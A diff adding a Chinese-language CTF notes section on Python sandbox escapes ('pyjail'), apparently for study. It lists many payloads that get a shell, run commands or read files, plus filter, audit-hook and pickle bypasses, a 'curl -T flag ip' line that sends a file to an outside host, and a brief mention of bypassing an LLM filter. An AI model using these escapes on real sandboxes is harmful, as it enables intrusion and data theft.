@@ -2,6 +2,340 @@
 
 此篇笔记对应的gist： https://gist.github.com/C0nstellati0n/78f5887b5bee235583a026840354ae54 。题目对应的关键词将加粗
 
+## Pyjail
+
+[Pyjail](https://cheatsheet.haax.fr/linux-systems/programing-languages/python/)([python沙盒逃逸](https://www.cnblogs.com/h0cksr/p/16189741.html))。这类题型知识点比较杂，记录一点看过的，以后要用就翻
+
+- `[*().__class__.__base__.__subclasses__()[50+50+37].__init__.__globals__.values()][47]([].__doc__[5+5+7::79])`
+> 利用\*符号将字典值转为列表，从而可使用\[\]取值+利用system函数和`__doc__`里的sh字符串getshell。例题:[Virus Attack](https://github.com/daffainfo/ctf-writeup/tree/main/2023/ByteBanditsCTF%202023/Virus%20Attack)。类似的题目还有里面提到的[Albatross](https://okman.gitbook.io/okman-writeups/miscellaneous-challenges/redpwnctf-albatross)，不过这道题多了个unicode哥特字符也能执行函数的考点：
+
+```python
+𝔭𝔯𝔦𝔫𝔱("hello!")
+#hello!
+```
+print函数可正常使用。提供一个简单的普通字母转哥特字母脚本。
+```py
+import string,sys
+fake_alphabet = "𝔞 𝔟 𝔠 𝔡 𝔢 𝔣 𝔤 𝔥 𝔦 𝔧 𝔨 𝔩 𝔪 𝔫 𝔬 𝔭 𝔮 𝔯 𝔰 𝔱 𝔲 𝔳 𝔴 𝔵 𝔶 𝔷".split(" ")
+real_alphabet = string.ascii_lowercase
+trans = str.maketrans("".join(real_alphabet), "".join(fake_alphabet))
+code = sys.argv[1]
+converted_code = code.translate(trans)
+print(converted_code)
+```
+- `("a"*118).__class__.__base__.__subclasses__()[118].get_data('flag.txt','flag.txt')`
+  - 任意文件读取。来源:[Pycjail](../../CTF/LA%20CTF/Misc/Pycjail.md)（任意文件读取/RCE）。知识点：
+    - LOAD_GLOBAL, LOAD_NAME, LOAD_METHOD和LOAD_ATTR是常用的加载可调用对象的opcode。
+    - IMPORT_FROM本质上还是LOAD_ATTR，只不过多了一层伪装。可以手工在使用LOAD_ATTR的地方将其改为IMPORT_FROM也不会有问题。
+    - 在python 的bytecode中，两种调用函数的方式分别为LOAD_METHOD+CALL_METHOD和LOAD_ATTR+CALL_FUNCTION.
+- `().__class__.__bases__[0].__subclasses__()[124].get_data('.','flag.txt')`.这种是上个的变种，两者都可以在jail环境无builtins时使用
+- 假如环境带有gmpy2，注意gmpy2.__builtins__是含有eval的，因此可以构造任意命令。在builtins里取函数和构造命令还可以通过拼接的形式，如：
+
+```python
+gmpy2.__builtins__['erf'[0]+'div'[2]+'ai'[0]+'lcm'[0]]('c_div'[1]+'c_div'[1]+'ai'[1]+'agm'[2]+'cmp'[2]+'cos'[1]+'erf'[1]+'cot'[2]+'c_div'[1]+'c_div'[1]+"("+"'"+'cos'[1]+'cos'[2]+"'"+")"+"."+'cmp'[2]+'cos'[1]+'cmp'[2]+'erf'[0]+'jn'[1]+"("+"'"+'cmp'[0]+'ai'[0]+'cot'[2]+" "+"/"+'erf'[2]+'lcm'[0]+'ai'[0]+'agm'[1]+"'"+")"+"."+'erf'[1]+'erf'[0]+'ai'[0]+'add'[1]+"("+")")
+```
+- print相关(无需eval)
+  - `print.__self__.__import__("os").system("cmd")`。绕过滤版本：`print.__self__.getattr(print.__self__.getattr(print.__self__, print.__self__.chr(95) + print.__self__.chr(95) + print.__self__.chr(105) + print.__self__.chr(109) + print.__self__.chr(112) + print.__self__.chr(111) + print.__self__.chr(114) + print.__self__.chr(116) + print.__self__.chr(95) + print.__self__.chr(95))(print.__self__.chr(111) + print.__self__.chr(115)), print.__self__.chr(115) + print.__self__.chr(121) + print.__self__.chr(115) + print.__self__.chr(116) + print.__self__.chr(101) + print.__self__.chr(109))("cmd")`
+  - 尝试读函数源码
+  ```py
+  print(<func>.__code__) #获取文件名，func为文件内的函数名
+  print(<fund>.__code__.co_names) #获取函数内调用的函数
+  print(<func>.__code__.co_code) #函数的字节码
+  print(<func>.__code__.co_consts) #函数内直接定义的常量
+  print(<func>.__code__.co_varnames) #函数内定义的变量
+  #https://github.com/HeroCTF/HeroCTF_v5/tree/main/Misc/pygulag ，内含字节码反编译脚本
+  ```
+  - `print.__self__.__loader__.load_module('o''s').spawnv(0, "/bin/sh", ["i"])`
+  - `print(print.__self__.__loader__().load_module('o' + 's').spawnvp(print.__self__.__loader__().load_module('o' + 's').P_WAIT, "/bin/sh", ["/bin/sh"]))`
+  - `print(print.__self__.__loader__.load_module('bu''iltins').getattr(print.__self__.__loader__.load_module('o''s'),'sy''stem')('sh'))`
+  - `print.__self__.setattr(print.__self__.credits, "_Printer__filenames", ["filename"]),print.__self__.credits()`,打印文件内容
+  - `print(globals.__self__.__import__("os").system("cmd"))`
+  - `print(().__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('cmd').read())`
+  - `print(''.__class__.__mro__[1].__subclasses__()[109].__init__.__globals__['sys'].modules['os'].__dict__['system']('cmd'))`
+  - `print("".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('sh'))`
+  - `print.__self__.__loader__.load_module('o''s').spawnl(0, "/bin/sh", "a")`
+  - `print(().__class__.__mro__[1].__subclasses__()[84]().load_module('o'+'s').__dict__['sy'+'stem']('cmd'))`
+  - `print([x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "_wrap_close"][0].__init__.__globals__['system']('cmd'))`
+  - `print(print.__self__.__loader__().load_module('o' + 's').__dict__['pop'+'en']('cmd').read())`
+  - `print.__self__.__dict__["__import__"]("os").system("cmd")`
+- 关于`eval(payload)`中payload的控制
+  - 不使用26个字母中的前13个字母（使用10进制ascii绕过）：`exec("pr\x69nt(op\x65n('\x66'+\x63\x68r(108)+'\x61\x67.txt').r\x65\x61\x64())")`
+  - 不使用26个字母中的后13个字母（使用8进制）：`exec("\160\162i\156\164(\157\160e\156('flag.\164\170\164').\162ead())")`,`exec("\160\162\151\156\164\050\157\160\145\156\050\047\146\154\141\147\056\164\170\164\047\051\056\162\145\141\144\050\051\051")`，`\145\166\141\154\50\151\156\160\165\164\50\51\51`(`eval(input)`)
+  - 不使用任何数字或括号：`[[help['cat flag.txt'] for help.__class__.__getitem__ in [help['os'].system]] for help.__class__.__getitem__ in [__import__]]`(执行命令)，`[f"{help}" for help.__class__.__str__ in [breakpoint]]`(开启pdb)
+  - 使用斜体:`𝘦𝘷𝘢𝘭(𝘪𝘯𝘱𝘶𝘵())`,`𝘦𝘹𝘦𝘤("𝘢=𝘤𝘩𝘳;𝘣=𝘰𝘳𝘥;𝘤=𝘣('൬');𝘥=𝘢(𝘤-𝘣('೸'));𝘱𝘳𝘪𝘯𝘵(𝘰𝘱𝘦𝘯(𝘢(𝘤-𝘣('ആ'))+𝘢(𝘤-𝘣('ഀ'))+𝘢(𝘤-𝘣('ഋ'))+𝘢(𝘤-𝘣('അ'))+'.'+𝘥+𝘢(𝘤-𝘣('೴'))+𝘥).𝘳𝘦𝘢𝘥())")`
+  - 不使用`__`:`()._＿class_＿._＿bases_＿[0]._＿subclasses_＿()[124].get_data('.','flag.txt')`(第二个`＿`是unicode里面的下划线，python自动标准化成`_`)
+  - 使用特殊字体：`ｂｒｅａｋｐｏｉｎｔ()`（开启pdb）
+- 当空格被过滤时，可以用tab键代替：`import    os`
+- `[module for module in ().__class__.__bases__[0].__subclasses__() if 'Import' in module.__name__][0].load_module('os').system('cmd')`,通过`class '_frozen_importlib.BuiltinImporter'>`模块导入os执行命令
+- `[ x.__init__.__globals__ for x in ().__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('cmd')`
+- `[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("cmd")`
+- `().__class__.__base__.__subclasses__()[141].__init__.__globals__["system"]("sh")`
+- `().__class__.__bases__[0].__subclasses__()[107]().load_module("os").system("cmd")`
+- 奇怪字体系列：
+  - `ｅｘｅｃ('ｐｒｉｎｔ(ｏｐｅｎ(' + ｃｈｒ(34) + ｃｈｒ(102) + ｃｈｒ(108) + ｃｈｒ(97) + ｃｈｒ(103) + ｃｈｒ(46) + ｃｈｒ(116)+ｃｈｒ(120)+ｃｈｒ(116) + ｃｈｒ(34) + ')' + ｃｈｒ(46)+'ｒｅａｄ())')`
+  - `𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵()`
+  - `𝑒𝓍𝑒𝒸(𝒾𝓃𝓅𝓊𝓉())`
+  - `𝘦𝘹𝘦𝘤(𝘪𝘯𝘱𝘶𝘵())`
+- 类似[fast-forward](https://github.com/hsncsclub/hsctf-10-challenges/tree/main/misc/fast-forward),[wp](https://ebonyx.notion.site/misc-fast-forward-v2-40c53a6a56ff4ad19523524065b2c9c3)的pyjial： 限制可使用的操作码和字节码，以及标识符的长度（the opcodes the bytecode is allowed to contain and the lengths of the identifiers, or “names” that we can use）。例如，只能使用5个字符长度以下的函数（print之类的，breakpoint就不行。不过字符串不限制长度）。以下是此类型题可用payload：
+  - `bt=vars(vars(type.mro(type)[1])['__getattribute__'](all,'__self__'));imp=bt['__import__'];bt['print'](bt['getattr'](bt['getattr'](vars(imp('inspect'))['currentframe'](),'f_back'),'f_globals')['flag'])`
+    - 用`object.__getattribute__`替代getattr。此题flag为一个全局变量，在调用输入代码的main函数中可访问。导入inspect模块并使用`inspect.currentframe().f_back`获取父栈帧即可从f_globals中获取。
+  - `(lambda: print((1).__class__.__base__.__subclasses__()[134].__init__.__globals__['system']('/bin/sh')))()`
+    - lambda函数可以“隐藏”函数名和参数名。来源：https://kos0ng.gitbook.io/ctfs/ctfs/write-up/2023/hsctf/misc#fast-forward-26-solves
+  - `E=type('',(),{'__eq__':lambda s,o:o})();x=vars(str)==E;x["count"]=lambda s,o:s` .详情见： https://github.com/python/cpython/issues/88004
+  ```py
+  #去除注释并用分号连接后使用
+  self = vars(type(chr))['__self__']
+  vrs = vars(type(self))['__get__'](self, chr)
+  open = vars(vrs)['open']
+  p = vars(vrs)['print']
+  gat = vars(vrs)['getattr']
+  fp = open('flag.txt', 'r')
+  flag = gat(fp, 'read')()
+  p(flag)
+
+  #或
+
+  # get vars() of <class 'type'>:
+  tvs = vars(type(type(1)))
+  # get __base__ attribute:
+  base = tvs['__base__']
+  # call base.__get__(type(1)) to get <class 'object'>:
+  ot = vars(type(base))['__get__'](base, type(1))
+  # pull getattr from <class 'object'>:
+  gat = vars(ot)['__getattribute__']
+  # get list of all classes:
+  cs = gat(ot, '__subclasses__')()
+  # find BuiltinImporter class:
+  ldr = [x for x in cs if 'BuiltinImporter' in str(x)][0]
+  # get load_module function:
+  ldm = gat(gat(ldr, 'load_module'), '__func__')
+  # load os and sys modules:
+  os = ldm(ldr, 'os')
+  sys = ldm(ldr, 'sys')
+  # os.open(flag.txt):
+  fp = gat(os, 'open')('flag.txt', gat(os, 'O_RDONLY'))
+  # os.read(fp):
+  flag = gat(os, 'read')(fp, 100)
+  # sys.stdout.write(flag.decode()):
+  gat(gat(sys, 'stdout'), 'write')(gat(flag, 'decode')())
+  ```
+  - `x = type.mro(type); x = x[1]; ga = vars(x)['__getattribute__']; sc = ga(x, '__subclasses__')(); pr = sc[136]('fleg',''); vars(pr)['_Printer__filenames'] = ['flag.txt']; pr()`,需要爆破`_Printer`的索引
+  - `o=type(()).mro()[1];g=vars(o)['__getattribute__'];b=g(chr,'__self__');i=g(b,'__import__');o=i('os');s=g(o,'system');s("python -c \"print(open('flag.txt').read())\"")`
+  ```py
+  vars(vars()["license"])["_Printer__lines"]=None
+  print(vars(vars()["license"])["_Printer__lines"])
+  vars(vars()["license"])["_Printer__filenames"]=["flag.txt"]
+  print(vars()["license"]())
+  ```
+  - `exit(vars(vars(type)["__subclasses__"](type.mro(type({}))[1])[99])['get_data'](vars(type)["__subclasses__"](type.mro(type({}))[1])[99]('flag.txt','./'),'flag.txt'))`
+  - `x = vars(); a = [ x[k] for k in x.keys() ][:-1];aa = a[76];ga = vars(aa)['__getattribute__'];scs = ga(ga(aa,'__base__'),'__subclasses__')(); o = ga(scs[84],'load_module')('os'); vars(o)['system']('/bin/bash')`
+  - `[1 for _ in '']+[x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__ == '_wrap_close'][0]['system']('/bin/sh')`
+  - `(lambda:__loader__.load_module("os").system("/bin/sh"))()`
+  - `(lambda:().__class__.__base__.__subclasses__()[100].__init__.__globals__["__builtins__"]["__import__"]("os").system("/bin/sh"))()`
+  - `__build_class__.__self__.__import__("os").system("sh")`
+- [rattler_read](https://github.com/sigpwny/UIUCTF-2023-Public/tree/main/challenges/pwn/rattler_read)
+    ```py
+    """
+    g=(print(g.gi_frame.f_back.f_back.f_builtins['open']('/flag.txt').read())for x in(0,))
+    for x in g:0
+    """.strip()
+    .replace("\n", "\r")
+    ```
+    - `[print(y('/flag.txt').read()) for x,y in enumerate(string.Formatter().get_field('a.__self__.open', [], {'a': repr})) if x==0]`
+    - `print(string.Formatter().get_field("a.__init__.__globals__[sys]", [], kwargs={"a":string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], kwargs={"a":[]})[0]().pop(107)})[0].modules.pop('os').popen('cmd').read())`
+    - https://github.com/nikosChalk/ctf-writeups/tree/master/uiuctf23/pyjail/rattler-read/writeup : `class Baz(string.Formatter): pass; get_field = lambda self, field_name, args, kwargs: (string.Formatter.get_field(self, field_name, args, kwargs)[0]("/bin/sh"), ""); \rBaz().format("{0.Random.__init__.__globals__[_os].system}", random)`
+    - https://ur4ndom.dev/posts/2023-07-02-uiuctf-rattler-read/ ：`string.Formatter().get_field("a.__class__.__base__.__subclasses__", [], {"a": ""})[0]()[84].load_module("os").system("sh")`,`for f in (g := (g.gi_frame.f_back.f_back for _ in [1])): print(f.f_builtins)`(逃逸exec的上下文然后请求builtin。这句还没有实现执行命令或者读文件，只是导出builtins。导出后参考上面的用法使用)
+- [Censorship](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship)：环境包含flag变量需要泄露+绕过滤
+    - 覆盖程序函数从而取消过滤。如题目用ascii(input)来保证输入只能是ascii。我们可以让`ascii = lambda x: x`，然后就能用非ascii字符绕过
+    - https://github.com/D13David/ctf-writeups/tree/main/amateursctf23/misc/censorship ：题目中存在包含flag的变量`_`，直接`locals()[_]`然后keyerror
+      - 类似的还有`{}[_]`,`vars()[_],globals()[_]`.要求题目会返回exception的内容
+    - `vars(vars()[(*vars(),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]])[(*vars(vars()[(*vars(),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]]),)[([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])+([]==[])]]()`:开启pdb
+    - `vars(vars()['__bu' + chr(105) + chr(108) + chr(116) + chr(105) + 'ns__'])['pr' + chr(ord('A') ^ ord('(')) + 'n' + chr(ord('H') ^ ord('<')) + ''](vars()[chr(102) + chr(108) + chr(97) + chr(103)])`
+    - https://github.com/rwandi-ctf/ctf-writeups/blob/main/amateursctf2023/censorships.md#censorship ：`vars(globals()["__buil" + chr(116) + "ins__"])["prin" + chr(116)](_)`。vars+globals构造字典取print
+    - https://xhacka.github.io/posts/writeup/2023/07/19/Censorship/ ：`vars(globals()[dir()[2]])[globals()[dir()[2]].__dir__()[42]](globals())`
+- [Censorship Lite](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship-lite)：类似Censorship但更多过滤
+    - intend解法可以getshell，但是有点复杂
+    - `any="".__mod__;print(flag)`:覆盖any函数后过滤失效，直接print. https://hackmd.io/@yqroo/Censorship-series
+    - `vars(vars()['__bu' + chr(ord('A')^ord('(')) + chr(ord('E')^ord(')')) + chr(ord('H') ^ ord('<')) + chr(ord('A')^ord('(')) + 'ns__'])['pr' + chr(ord('A') ^ ord('(')) + 'n' + chr(ord('H') ^ ord('<')) + ''](vars()['f' + chr(ord('E')^ord(')')) + 'ag'])`
+    - https://xhacka.github.io/posts/writeup/2023/07/19/Censorship/#censorship-lite : `vars(vars()[[*vars()][ord('A')-ord('B')]])[[*vars(vars()[[*vars()][ord('A')-ord('B')]])][ord('M')-ord('A')]]()`,开启pdb
+    - https://github.com/aparker314159/ctf-writeups/blob/main/AmateursCTF2023/censorships.md ：利用[tadpole operator](https://devblogs.microsoft.com/oldnewthing/20150525-00/?p=45044)(c++里面一个冷门语法，python里也有，作用是返回加上/减去1后的值，但不像`++,--`那样改变原变量的值。`-~y`等同于y+1,`~-y`等同于y-1)
+- [Censorship Lite++](https://github.com/les-amateurs/AmateursCTF-Public/tree/main/2023/misc/censorship-lite%2B%2B):泄露flag变量，但是过滤部分字符和符号以及全部数字
+    - https://github.com/rwandi-ctf/ctf-writeups/blob/main/amateursctf2023/censorships.md#censorship-lite-1 :过滤掉部分字符后可以利用python对字符串的[转换](https://stackoverflow.com/questions/961632/convert-integer-to-string-in-python)从函数等地方取。
+- [Get and set](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Get%20and%20set):能无限次对某个空object使用`pydash.set_`和`pydash.get`，参数无限制，实现rce。总体思路：Get `__builtins__` from `__reduce_ex__(3)[0].__builtins__`, and you can call arbitrary functions using magic methods like `__getattr__` or `__getitem__`
+- [You shall not call](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call),[wp](https://gist.github.com/lebr0nli/eec8f5addd77064f1fa0e8b22b6a54f5)；[You shall not call Revenge](https://github.com/ImaginaryCTF/ImaginaryCTF-2023-Challenges/tree/main/Misc/you_shall_not_call-revenge),[wp](https://gist.github.com/lebr0nli/53216005991d012470c0bde0f38952b1):两个都是有关pickle的的pyjail，用有限的pickle code构造pickle object。前者只需读文件，revenge需要得到rce
+- [My Third Calculator](https://ireland.re/posts/TheFewChosen_2023/#my-third-calculator):`__import__('antigravity',setattr(__import__('os'),'environ',{'BROWSER':'/bin/sh -c "curl -T flag ip;exit" #%s'}))`.antigravity是python里一个彩蛋模块，导入它会打开[xkcd](https://xkcd.com/353/)。通过将环境变量browser改为shell命令，就能在导入时执行shell命令而不是打开网页
+- `list(open("flag.txt"))`/`str([*open('flag.txt')])`/`open('flag.txt').__next__()`:没有read函数的情况下读取文件。需要在`print(eval(input()))`或者python console的情况下使用。单纯eval是没有输出的。加个print就有输出了：`print(*open("flag.txt"))`
+- [PyPlugins](https://blog.maple3142.net/2023/06/05/justctf-2023-writeups/#pyplugins): python是能接受zip file当作input的(参考zipapp)，里面的运作原理和一般zip解压缩很像，就是找zip的end of central directory之类的。另一方面CPython还有个pyc档案包含了一些header和code object，而code object上又会有co_consts的存在。所以如果你有个Python里面有个很长的byte literal包含了一个zip，它编译成pyc之后会直接在里面展开，而此时去执行它的时候CPython反而是会因为那个zip signature而把它误认成zip来执行。可利用此绕过非常严格的opcodes限制。`runpy.run_path(py_compile.compile(path))`
+```py
+#生成path指向的文件内容
+import tempfile
+import zipfile
+import base64
+def create_zip_payload() -> bytes:
+    file_name = "__main__.py"
+    file_content = b'import os;os.system("/bin/sh")'
+    with tempfile.TemporaryFile(suffix=".zip") as f:
+        with zipfile.ZipFile(f, "w") as z:
+            z.writestr(file_name, file_content)
+        f.seek(0)
+        return f.read()
+temp=f"pwn={create_zip_payload()!r}"
+print(base64.b64encode(temp.encode()))
+```
+- [obligatory pyjail](https://github.com/abhishekg999/CTFWriteups/tree/main/LITCTF/obligatory%20pyjail)
+  - 禁止除exec或compile外的[audit events](https://docs.python.org/3/library/audit_events.html)。`__import__('os')`和`__loader__.load_module`不会触发import audit event；`_posixsubprocess.fork_exec`可以在最底层执行exec，不会被audit event捕捉到
+  - `__builtins__.__loader__.load_module('_posixsubprocess').fork_exec([b"/bin/cat", b'flag.txt'], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__('os').pipe()), False, False, None, None, None, -1, None)`
+  - `__import__("_posixsubprocess").fork_exec(['cat', 'flag.txt'], (b'/bin/cat',), True, (7,), None, None, -1, -1, __import__("os").pipe()[0], 5, -1, -1, __import__("os").pipe()[0], 7, True, False, None, None, None, -1, None)+print(__import__("os").read(4, 1000).decode())`
+  - `[lm:=().__class__.__base__.__subclasses__()[104].load_module,p:=__import__("os").pipe,_ps:=lm("_posixsubprocess"),_ps.fork_exec([b"/bin/cat", b"flag.txt"], [b"/bin/cat"], True, (), None, None, -1, -1, -1, -1, -1, -1, *(p()), False, False, None, None, None, -1, None)]`
+- [wow it's another pyjail](https://github.com/abhishekg999/CTFWriteups/tree/main/LITCTF/wow%20its%20another%20pyjail)
+  - 有关RestrictedPython的漏洞。可以利用format访问用下划线开头的属性（这类属性正常情况下是被保护的，无法直接访问）
+- [Just Another Pickle Jail](https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/misc/just-another-pickle-jail)
+  - 其他解：
+  ```py
+  mgk = GLOBAL('', 'mgk')
+  up = GLOBAL('', 'up')
+  __main__ = GLOBAL('', '__main__')
+  __getattribute__ = GLOBAL('', '__getattribute__')
+  __init__ = GLOBAL('', '__init__')
+  __builtins__ = GLOBAL('', '__builtins__')
+  BUILD(up, None, {'banned': [], '__import__': __init__})
+  BUILD(mgk, None, {'nested': up})
+  BUILD(__main__, None, {'__main__': __builtins__})
+  BUILD(up, None, {'__import__': __getattribute__})
+  builtins_get = GLOBAL('', 'get')
+  BUILD(up, None, {'__import__': __init__})
+  BUILD(up, None, {'persistent_load': builtins_get})
+  exec = PERSID('exec')
+  BUILD(up, None, {'persistent_load': exec})
+  PERSID('sys.modules["os"].system("sh")')
+  ```
+  ```py
+  b'''c\n__main__\n\x94c\n__builtins__\n\x94b0c\n__getattribute__\n\x940c\nmgk\n\x940c\nup\n\x940h\3N(S"banned"\n]S"__import__"\nc\ntuple\nS"nested"\nh\3d\x86b0h\0N(S"__main__"\nh\1d\x86b0h\3N(S"__import__"\nh\2d\x86b0h\4(S"persistent_load"\nc\n__getitem__\ndb(S"persistent_load"\nPexec\ndb0Pnext(x for x in object.__subclasses__() if 'BuiltinImporter' in str(x)).load_module("os").system("sh")\n.'''
+  ```
+  ```py
+  import sys
+  sys.path.insert(0, "./Pickora")
+  from pickora import Compiler
+  import pickletools
+  def unary(result_name, fn_name, arg_name):
+      return f"""__builtins__['next'] = {fn_name}
+  up._buffers = {arg_name}
+  {result_name} = NEXT_BUFFER()
+  """
+  pk = Compiler().compile(
+      f"""
+  from x import Unpickler, __main__, __builtins__, up
+  BUILD(__main__,__builtins__,None)
+  from x import getattr, print, vars, dir, object, type, dict, list
+  {unary('val', 'vars', 'dict')}
+  BUILD(__main__,val,None)
+  from x import values as dictvalues
+  {unary('val', 'vars', 'list')}
+  BUILD(__main__,val,None)
+  from x import pop as listpop
+  {unary('val', 'vars', 'list')}
+  BUILD(__main__,val,None)
+  from x import reverse as listreverse
+  {unary('bl', 'dictvalues', '__builtins__')}
+  {unary('bl', 'list', 'bl')}
+  {unary('_', 'listreverse', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  {unary('val', 'listpop', 'bl')}
+  s = 'object.mgk.nested.__import__("os").system("sh")'
+  {unary('val', 'val', 's')}
+  """
+  )
+  ```
+- 进入python的help()界面后，可以随便输入一个模块（如os）然后输入`:e [filename]`读取文件(默认使用less命令展示文档)。有些时候远程机器开启了socat，这时help函数后在控制台打`!sh`即可getshell。参考 https://zhuanlan.zhihu.com/p/578986988 。help函数还可以用来泄露变量，如进入help函数后使用`__main__`
+- [PyMagic](https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Misc/PyMagic)：禁`()'"0123456789 `字符，eval环境无`__builtins__`，但有一个空类
+  - 一些有助于构造payload的链接：
+    - https://codegolf.stackexchange.com/questions/264291/how-turing-complete-is-your-language
+    - https://sopython.com/wiki/Riddles
+    - https://github.com/b01lers/b01lers-ctf-2021/tree/main/misc/noparensjail ：覆盖`<`号为system
+  - 其他wp： https://github.com/SuperStormer/writeups/tree/master/tcp1pctf_2023/misc/pymagic
+- [vampire](https://github.com/SuperStormer/writeups/tree/master/tcp1pctf_2023/misc/vampire)
+  - 过滤数字和一些特殊字符。eval环境下有re模块，所以利用re实现rce
+  - 官方wp： https://github.com/TCP1P/TCP1P-CTF-2023-Challenges/tree/main/Misc/vampire
+- [Python Jail](https://crusom.dev/posts/blue_hens_ctf_2023#challenge-python-jail)
+  - 利用波浪线和减号获取任意数字： https://esolangs.org/wiki/Symbolic_Python
+  - python内部有个`__doc__`属性，可以由此获取任意字符
+- [Avatar](https://github.com/4n86rakam1/writeup/tree/main/GlacierCTF_2023/misc/Avatar)
+  - 利用f string(`f'{}'`)构造字符并实现双eval RCE。`f"{97:c}"`输出为a
+  - 其他做法： **avatar**
+- eval里不能用=号定义变量或给变量赋值，但是用海象运算符`:=`可以
+- [least ELOistic fish](https://github.com/Cryptonite-MIT/niteCTF-2023/tree/main/misc/least%20ELOistic%20fish)
+  - 利用多重getattr套娃和bytearray绕过过滤
+  - 这题本身是python stockfish（国际象棋分析库）的使用，因为输入未被过滤，可以直接跳过当前输入，让stockfish自己和自己下棋
+- [LLM Sanitizer](https://1-day.medium.com/llm-sanitizer-real-world-ctf-2024-walkthrough-233dbdb0b90f)
+  - 绕语言模型过滤。其他解法： **llm sanitizer**
+- [Diligent Auditor](https://ur4ndom.dev/posts/2024-02-11-dicectf-quals-diligent-auditor/)
+  - 在只能使用import导入一个名称不含下划线及`.`模块且大部分builtins被删除，添加audithook的情况下实现RCE/读文件
+  - FileFinder内部的`_path_cache`缓存着文件夹下的所有文件名称，意味着即使不知道flag完整的文件名（只知道名称包含flag），也能通过`_path_cache`找到完整的文件名并读取
+  - 使用readline类读取文件。open会被audit hook监视，但用readline读文件则不会触发audit hook
+  - 一些利用ctypes绕过audit hook逃脱pyjail并获取RCE的技巧
+  - 其他解法： **diligent auditor**
+- [IRS](https://maplebacon.org/2024/02/dicectf2024-irs/)
+  - 算是上面那道题的究极升级版（加了ast以及其他乱七八糟的过滤），甚至利用到了python内部的uaf。没有简略总结因为全篇都是知识点
+- [pyquinejailgolf](https://gerlachsnezka.github.io/writeups/amateursctf/2024/jail/pyquinejailgolf/)
+  - 使用python编写[quine](https://en.wikipedia.org/wiki/Quine_(computing)) 程序（输出自己源码的程序）。注意payload被包在题目文件里执行，所以部分payload会利用这点，导致其单独运行不是quine程序，只有在题目文件里才是
+  - 其他做法： **pyquinejailgolf**
+- [Picklestar](https://github.com/cr3mov/cr3ctf-2024/tree/main/challenges/misc/picklestar)
+  - python pickle反序列化挑战，限制可使用的opcode和字符串实现RCE。可以用INST字节码调用breakpoint然后执行命令
+- [my-favorite-code](https://github.com/acmucsd/sdctf-2024/tree/main/misc/my-favorite-code)
+  - 只能用两个python opcode调用breakpoint函数（建议看题目源码，要求`dis.Bytecode`返回的函数opcode只有两种，一个是COMPARE_OP，另一个自选）
+  - 在discord的聊天里艰难地拼出了一个wp: **my-favorite-code** 。关键点在于利用python 3.11新加的功能code objects cache（见 https://docs.python.org/3.11/whatsnew/3.11.html#cpython-bytecode-changes 和  https://github.com/python/cpython/issues/90997 ）隐藏部分opcode。cache的部分不会被`dis.Bytecode`看到
+- [PySysMagic](https://github.com/salvatore-abello/CTF-Writeups/blob/main/L3ak%20CTF%202024/PySysMagic)
+  - obligatory pyjail+PyMagic(这两题我竟然都记过)。这题倒没什么绕过audit hook的技巧，但是pyjail技巧不少
+  - wp作者的python相关cheatsheet： https://github.com/salvatore-abello/python-ctf-cheatsheet
+  - 官方wp： https://github.com/L3AK-TEAM/L3akCTF-2024-public/tree/main/misc/PySysMagic
+- 一些只用了较少python printable字符的RCE payload： `𝕤𝕪𝕤.𝕞𝕠𝕕𝕦𝕝𝕖𝕤['os'].𝕤𝕪𝕤𝕥𝕖𝕞('sh')`，`[*𝔰𝔶𝔰.𝔪𝔬𝔡𝔲𝔩𝔢𝔰.𝔳𝔞𝔩𝔲𝔢𝔰()][29].𝔰𝔶𝔰𝔱𝔢𝔪(𝔰𝔶𝔰.𝔢𝔵𝔢𝔠𝔲𝔱𝔞𝔟𝔩𝔢)`
+- [JailBreak Revenge](https://ctf.krauq.com/bcactf-2024)
+  - 可使用`locals()["param"]`获取文件里名为param的参数的值
+  - 禁数字的情况下不使用等于号获取数字：`[]<[()]`
+  - 其他wp： https://github.com/D13David/ctf-writeups/tree/main/bcactf5/misc/jailbreak
+    - 如何查看jail环境下可用的builtin函数
+- [Astea](https://octo-kumo.me/c/ctf/2024-uiuctf/misc/astea)
+  - 禁止使用以下操作：assign, call, import, import from, binary operation (`+-/`等)，尝试获取RCE。可以用函数装饰器（function decorators），但是这样出来的payload不是一行。一行的做法可以用AnnAssign（之前真没见过这种语法）。属于abstract syntax tree（ast）sandbox题
+  - 其他做法: **astea** 。用海象运算符（walrus operator）+list comprehension，以及其他很好的wp
+- [Calc](https://crocus-script-051.notion.site/Calc-dbdf7f34430d403d9a1550f88b2a4316)
+    - 和audit hook有关的题。要求在不触发任何audit event的情况下获得shell且payload有长度限制。不确定在不触发任何audit event的情况下能不能getshell，但看这道题可以做到获取套娃函数里的参数并覆盖
